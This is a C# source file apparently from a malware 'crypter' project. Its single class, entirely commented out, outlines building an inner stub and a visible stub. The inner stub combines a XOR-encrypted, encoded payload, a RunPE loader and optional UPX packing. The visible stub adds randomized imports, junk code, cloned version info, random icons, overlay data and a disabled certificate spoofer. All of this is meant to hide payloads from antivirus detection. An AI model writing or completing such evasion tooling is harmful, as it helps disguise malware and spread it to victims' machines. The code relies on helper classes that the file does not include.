using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

using xNewPE = CryptEngine.NewPE.NewPE;
using CryptEngine.NewPE;
using CryptEngine.NewPE.Structs;

using CryptEngine.Constructors;
using CryptEngine.Cryptography;
using CryptEngine.Extensions;
using CryptEngine.Structures;
using System.Diagnostics;

namespace CryptEngine
{
    //public class StubBuilder : IDisposable
    //{

    //    // public CryptDirectory WorkingDirectory;

    //    //public StubBuilder() { }
    //    //public StubBuilder(string RootPath, string InstanceDirPath)
    //    //{
    //    //    setWorkingDirectory(RootPath, InstanceDirPath);
    //    //}

    //    //public void setWorkingDirectory(string RootPath, string InstanceDirPath)
    //    //{
    //    //    string workspaceDir = Directory.CreateDirectory(
    //    //        Path.Combine(InstanceDirPath,
    //    //        Path.GetFileNameWithoutExtension(Path.GetRandomFileName()))).FullName;

    //    //    DirectoryCopy(RootPath, workspaceDir);
    //    //    WorkingDirectory = new CryptDirectory(workspaceDir);
    //    //}

    //    //private void DirectoryCopy(string sourceDirName, string destDirName)
    //    //{
    //    //    DirectoryInfo dir = new DirectoryInfo(sourceDirName);
    //    //    DirectoryInfo[] dirs = dir.GetDirectories();

    //    //    if (!Directory.Exists(destDirName))
    //    //    {
    //    //        Directory.CreateDirectory(destDirName);
    //    //    }

    //    //    FileInfo[] files = dir.GetFiles();
    //    //    foreach (FileInfo file in files)
    //    //    {
    //    //        string temppath = Path.Combine(destDirName, file.Name);
    //    //        file.CopyTo(temppath, false);
    //    //    }

    //    //    foreach (DirectoryInfo subdir in dirs)
    //    //    {
    //    //        string temppath = Path.Combine(destDirName, subdir.Name);
    //    //        DirectoryCopy(subdir.FullName, temppath);
    //    //    }
    //    //}

    //    //public void ConstructInnerStub(InnerStub IStub)
    //    //{
    //    //    string RootDir = "X:\\Crypt PE\\ASM New";

    //    //    xNewPE PE = new xNewPE();

    //    //    PE.PeDirectory = PEDirectory.SetRootPath(RootDir);

    //    //    PE.ConstructDosHeader();
    //    //    PE.WriteDosHeader();
    //    //    PE.WriteRichSignature();

    //    //    string TlsCallbackInc = Path.Combine(PE.PeDirectory.IncludeDirectory, "tls_callback.inc");

    //    //    JunkCodeConstructor junkConstructor = new JunkCodeConstructor();
    //    //    junkConstructor.WriteLogicalFunctionsToTextSection(PE.PeDirectory.TextSectionPath, 1);
    //    //    junkConstructor.WriteLogicalTrashToTLSCallback(TlsCallbackInc, 1);

    //    //    ImportConstructor impConstructor = new ImportConstructor(PE.PeDirectory.ImportsDirectory);
    //    //    impConstructor.RandomizeImportTable();
    //    //    impConstructor.FreeModules();
    //    //    impConstructor.ConstructSectionSource(PE.PeDirectory.IDataSectionPath);

    //    //    PEFactory.CompileIDataSection(PE);
    //    //    PEFactory.CompileDataSection(PE);
    //    //    PEFactory.CompileRunPESection(PE);
    //    //    PEFactory.CompileTLSSection(PE);

    //        //// <--- Initialize Keys --->
    //        //IStub.PayloadKey = new byte[16];
    //        //IStub.RunPEKey = new byte[16];

    //        //// <--- Generate Keys --->
    //        //Keys.PopulateBuffer(IStub.PayloadKey);
    //        //Keys.PopulateBuffer(IStub.RunPEKey);

    //        //// <--- UPX Payload --->
    //        //if (IStub.UseUPX)
    //        //    UPXUtility.UPXCompress(ref IStub.Payload, WorkingDirectory.OptionalDirectory);

    //        //// <--- Encrypt (XOR) Payload --->
    //        //IStub.XorPayload = new byte[IStub.Payload.Length];

    //        //// <--- *** IMPORTANT - WE ARE ONLY USING ONE KEY, FOR BOTH THE RUNPE + PAYLOAD *** --->
    //        //Xor.EncodeDecodeData(IStub.Payload, IStub.XorPayload, IStub.RunPEKey /* IStub.PayloadKey */);

    //        //// <--- Encode (LENCODE) Payload --->
    //        //IStub.EncodePayload = LEncode.Encode(IStub.XorPayload);

    //        //// <--- Write final payload --->
    //        //WorkingDirectory.CreateIncFile("payload.inc", IStub.EncodePayload, false);

    //        //// <--- Write keys --->
    //        //WorkingDirectory.CreateIncFile("payload_key.inc", IStub.RunPEKey /* only uses one key! */, true);
    //        //WorkingDirectory.CreateIncFile("runpe_key.inc", IStub.RunPEKey, true);

    //        //// <--- Obtain RunPE path --->
    //        //IStub.RunPEPath = Path.Combine(WorkingDirectory.ObjDirectory, "runpe.o");

    //        //// <--- Compile RunPE --->
    //        //WorkingDirectory.CompileRunPE();
    //        //IStub.RunPE = IStub.RunPEPath.ReadBytes();

    //        //// <--- Encrypt (XOR) RunPE --->
    //        //IStub.XorRunPE = new byte[IStub.RunPE.Length];
    //        //Xor.EncodeDecodeData(IStub.RunPE, IStub.XorRunPE, IStub.RunPEKey);

    //        //// <--- Write encrypted RunPE --->
    //        //IStub.XorRunPE.WriteFileBytes(IStub.RunPEPath);
    //    }

    //    public void ConstructVisibleStub(OutterStub OStub)
    //    {
    //        //            // <--- Generate TimeDateStamp --->
    //        //            OStub.TDSCtor.ConstructUniqueTimeDateStamp(WorkingDirectory.MainPath);

    //        //            // <--- Randomize imports --->
    //        //            OStub.ImportCtor.RandomizeImportTable();
    //        //            OStub.ImportCtor.FreeModules();

    //        //            // <--- Create IData Section --->
    //        //            string iatPath = Path.Combine(WorkingDirectory.SectionsDirectory, "idata.asm");
    //        //            OStub.ImportCtor.ConstructSectionSource(iatPath);
    //        //            WorkingDirectory.CompileIData();

    //        //            // <--- Create Data Section --->
    //        //            string dPath = Path.Combine(WorkingDirectory.SectionsDirectory, "data.asm");
    //        //            // OStub.DataCtor.ConstructHeuristicSection(dPath);
    //        //            WorkingDirectory.CompileData();

    //        //            // <--- Create Text Section --->
    //        //            string TextSectionPath = Path.Combine(WorkingDirectory.SectionsDirectory, "text.asm");
    //        //            OStub.JunkCtor.WriteLogicalTrashToVisibleStub(TextSectionPath, WorkingDirectory.MainPath, OStub.JunkCodeMultiplier);
    //        //            WorkingDirectory.CompileText();

    //        //            // <--- Compute Section Addresses --->
    //        //            string SectionIncPath = Path.Combine(WorkingDirectory.IncludesDirectory, "section_addresses.inc");
    //        //            SectionAddresses.ComputeAddresses(SectionIncPath, WorkingDirectory.ObjDirectory, WorkingDirectory.IncludesDirectory);

    //        //            WorkingDirectory.CompileIData();
    //        //            WorkingDirectory.CompileData();

    //        //            // <--- Compile sections, excluding runpe --->
    //        //            // WorkingDirectory.CompileAllOtherSections();

    //        //            //section gets compiled, it doesn't know the size before hand.
    //        //            // <--- Compile file into .exe (\bin\savefilename.exe) --->
    //        //            WorkingDirectory.CompileMain(OStub.SaveFileName);

    //        //            // POST BUILD:
    //        //            string tmpPath = Path.Combine(WorkingDirectory.BinDirectory, OStub.SaveFileName);

    //        //            // <--- Add Main Resource --->
    //        //            Resources.AddResourceToFile(tmpPath, Path.Combine(WorkingDirectory.IncludesDirectory, "payload.inc"), "A");

    //        //            // <--- Construct Version Info  --->
    //        //            if (!String.IsNullOrEmpty(OStub.CloneFilePath)) // User Defined VERSION_INFO
    //        //                Resources.ConstructVersionInfo(tmpPath, OStub.CloneFilePath, WorkingDirectory.ResourceDirectory);
    //        //            // else // Use a random VERSION_INFO from (SYSWOW64)
    //        //            //    Resources.ConstructHeuristicVersionInfo(tmpPath, WorkingDirectory.ResourceDirectory);

    //        //            // <--- Construct Heuristic Resources --->
    //        //            Resources.ConstructRandomStringTable(tmpPath, WorkingDirectory.ResourceDirectory);
    //        //            Resources.ConstructRandomIconSet(tmpPath, WorkingDirectory.ResourceDirectory);

    //        //            // <--- Append EOF / Overlay Data --->
    //        //            PEOverlay Overlay = new PEOverlay(tmpPath);

    //        //            if (Overlay.HasOverlay)
    //        //                Overlay.AppendOverlayDataToFile(tmpPath);

    //        //            // // <--- Spoof Cert --->
    //        //            // CertSpoofer.SpoofCert(tmpPath, WorkingDirectory.CertDirectory);

    //        //#if(DEBUG)
    //        //            System.Diagnostics.Process.Start(Directory.GetParent(tmpPath).FullName);
    //        //#endif

    //    }

    //    //public void StageThree_ProcessPostBuild()
    //    //{

    //    //}

    //    //public void StageFour_FinalizeStub()
    //    //{

    //    //}

    //    //public void Dispose()
    //    //{
    //    //    WorkingDirectory.Dispose();
    //    //}
    //}
}
